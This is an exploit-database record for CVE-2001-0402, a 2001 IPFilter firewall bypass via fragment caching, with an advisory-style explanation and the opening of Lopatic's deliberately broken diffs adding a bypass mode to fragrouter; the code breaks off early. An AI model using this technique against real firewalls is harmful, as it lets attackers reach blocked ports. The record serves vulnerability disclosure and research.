{
    "text": "ecve : CVE-2001-0402 ， title : IPFilter 3.x - Fragment Rule Bypass - Unix remote Exploit ， verified : Verified ， exploit_detail : source :  ， IPFilter is a packet filtering implementation that is in wide use on a variety of Unix systems. ， There exists a vulnerability in IPFilter that can allow an attacker to communicate with blocked ports on hosts behind an IPFilter firewall. ， The vulnerability is the result of IPFilter caching the decision to forward or drop a fragment , and applying this decision to other IP fragments with the same IP id. Even when a fragment is an 'initial' fragment ( fragment with a fragment offset of 0 ) which may contain a TCP or UDP header , it will be evaluated based on the decision cache. ， As a result , an attacker can establish a 'permit' decision cache in an IPFilter firewall and then successfully pass fragments with arbitrary UDP or TCP headers through the firewall bypassing the ruleset. ，  # Originally from Thomas Lopatic's advisory ,  ，  # posted to Bugtraq on April 9 , 2001. ， Demonstration source code ， These are the - intentionally slightly broken - diffs to be applied to ， fragrouter 1.6 to implement the described attack. Supply the \"-M3\" ， option to fragrouter and route all your packets to the fragrouter host ， to comfortably walk through an IP Filter installation that exposes the ， described vulnerability. ， ---- cut here ---- ， diff -c -r fragrouter-1.6.orig/attack.c fragrouter-1.6/attack.c ， fragrouter-1.6.orig/attack.c Tue Sep 21 17 : 16 : 59 1999 ， --- fragrouter-1.6/attack.c Sat Apr 7 16 : 59 : 05 2001 ， 126 , 132 ， NULL , / * ATTACK_MISC * / ， \"misc-1 : Windows NT 4 SP2 - ， \"misc-2 : Linux IP chains - ，  ! NULL ,  ， NULL ,  ， NULL ,  ， NULL ,  ， --- 126 , 132 ---- ， NULL , / * ATTACK_MISC * / ， \"misc-1 : Windows NT 4 SP2 - ， \"misc-2 : Linux IP chains - ，  ! \"misc-3 : IP Filter - consult the bugtraq archives for April 2001 : - ) \" ,  ， NULL ,  ， NULL ,  ， NULL ,  ， 209 , 214 ， --- 209 , 217 ---- ， frag = misc_linuxipchains ( pkt , len )  ;  ， + } ， + if ( attack_num == 3 ) { ， + frag = misc_ipfilter ( pkt , len )  ;  ， send_list ( frag->head )  ;  ， diff -c -r fragrouter-1.6.orig/misc.c fragrouter-1.6/misc.c ， fragrouter-1.6.orig/misc.c Tue Sep 21 17 : 14 : 07 1999 ， --- fragrouter-1.6/misc.c Sat Apr 7 17 : 15 : 56 2001 ， 206 , 208 ， --- 206 , 422 ---- ， + / *  ， + * This demonstrates a fragmentation vulnerability in IP Filter. ， + *  ， + * The code needs a small corretion to work properly. ， + *  ， + * Thomas Lopatic , 2001-04-06 ， + * / ， + / *  ， + * These are the ports that we have access to. ， + * /",
    "time": "2001-04-09"
}